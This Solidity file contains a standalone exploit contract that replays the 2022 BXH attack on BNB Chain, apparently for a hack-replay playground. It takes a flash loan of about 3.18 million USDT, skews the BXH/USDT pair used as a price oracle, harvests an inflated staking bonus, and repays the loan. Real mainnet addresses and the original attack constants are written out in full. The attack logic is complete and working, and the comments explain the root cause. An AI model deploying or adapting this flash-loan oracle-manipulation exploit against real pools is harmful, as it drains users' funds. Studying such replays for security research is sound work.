// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-09-BXH).
// The DeFiHackLabs PoC (test/BXH_exp.sol) runs the attack INLINE in the Foundry
// `Attacker is Test` contract — the `pancakeCall` flash-swap callback lives on the
// test itself, and the bonus harvest is `vm.prank`-ed as the pre-existing staker
// `0x4e77…`. There is therefore no standalone contract to deploy. This file is a
// faithful, self-contained copy of that inline attack so the playground can etch
// it at the historical attack-contract address (which IS the staker `0x4e77…` in
// the dump) and record run(). Logic and constants are copied verbatim from
// test/BXH_exp.sol (testExploit + pancakeCall); the only change is that, because
// this contract is etched at the staker's address, deposit(0,0) is called directly
// instead of via vm.prank, and the harvested bonus stays in this contract.
//
// Root cause: TokenStakingPoolDelegate values its "bonus" USDT payout using the
// LIVE reserves of the BXH/USDT AMM pair (getITokenBonusAmount → getReserves with
// fee=0). A flash-loan that skews the pair inflates a ~15 BXH reward into ~40,821
// USDT, draining the pool's entire bonus reserve.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IUniswapV2Pair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface ITokenStakingPoolDelegate {
    function deposit(uint256 _pid, uint256 _amount) external;
}

contract BXHDrain {
    // --- addresses (BSC) ---
    address constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    address constant BXH = 0x6D1B7b59e3fab85B7d3a3d86e505Dd8e349EA7F3;
    address constant USDT_WBNB_PAIR = 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE; // flash-loan source
    address constant BXH_USDT_PAIR = 0x919964B7f12A742E3D33176D7aF9094EA4152e6f; // price oracle
    address constant BXH_ROUTER = 0x6A1A6B78A57965E8EF8D1C51d92701601FA74F01;
    address constant STAKING_POOL = 0x27539B1DEe647b38e1B987c41C5336b1A8DcE663;

    // --- constants copied verbatim from test/BXH_exp.sol ---
    uint256 constant FLASH_BORROW = 3_178_800_000_000_000_000_000_000; // 3,178,800 USDT
    uint256 constant POOL_GIFT = 805_614_870_582_412_124_618; // 805.6 USDT top-up so payout fits
    uint256 constant FLASH_FEE_BPS = 26; // 0.26% flash-loan fee (amount0 * 26 / 10000)

    IERC20 constant usdt = IERC20(USDT);
    IERC20 constant bxh = IERC20(BXH);
    IUniswapV2Pair constant usdtWbnbPair = IUniswapV2Pair(USDT_WBNB_PAIR);
    IRouter constant bxhRouter = IRouter(BXH_ROUTER);
    ITokenStakingPoolDelegate constant staking = ITokenStakingPoolDelegate(STAKING_POOL);

    // step 0: flash-borrow 3,178,800 USDT from the USDT/WBNB pair; pancakeCall drains.
    function run() external {
        usdtWbnbPair.swap(FLASH_BORROW, 0, address(this), "0x");
    }

    function pancakeCall(address, uint256 amount0, uint256, bytes calldata) external {
        require(msg.sender == USDT_WBNB_PAIR, "only flash pair");

        // step 1: skew the BXH/USDT price oracle — swap USDT -> BXH on the BXH router.
        usdt.approve(BXH_ROUTER, type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = USDT;
        path[1] = BXH;
        bxhRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            usdt.balanceOf(address(this)) - POOL_GIFT, 1, path, address(this), block.timestamp
        );

        // step 2: gift 805.6 USDT to the staking pool so the inflated payout fits.
        usdt.transfer(STAKING_POOL, POOL_GIFT);

        // step 3: harvest at the skewed price. This contract IS the staker 0x4e77…
        // (etched at that address), so deposit(0,0) pays the inflated USDT bonus here.
        staking.deposit(0, 0);

        // step 4: sell the corner'd BXH back to USDT.
        bxh.approve(BXH_ROUTER, type(uint256).max);
        address[] memory bxhUsdtPath = new address[](2);
        bxhUsdtPath[0] = BXH;
        bxhUsdtPath[1] = USDT;
        bxhRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            bxh.balanceOf(address(this)), 1, bxhUsdtPath, address(this), block.timestamp
        );

        // step 5: repay the flash loan + 0.26% fee. Remaining USDT is the profit.
        uint256 swapfee = amount0 * FLASH_FEE_BPS / 10_000;
        usdt.transfer(USDT_WBNB_PAIR, amount0 + swapfee);
    }

    receive() external payable {}
}
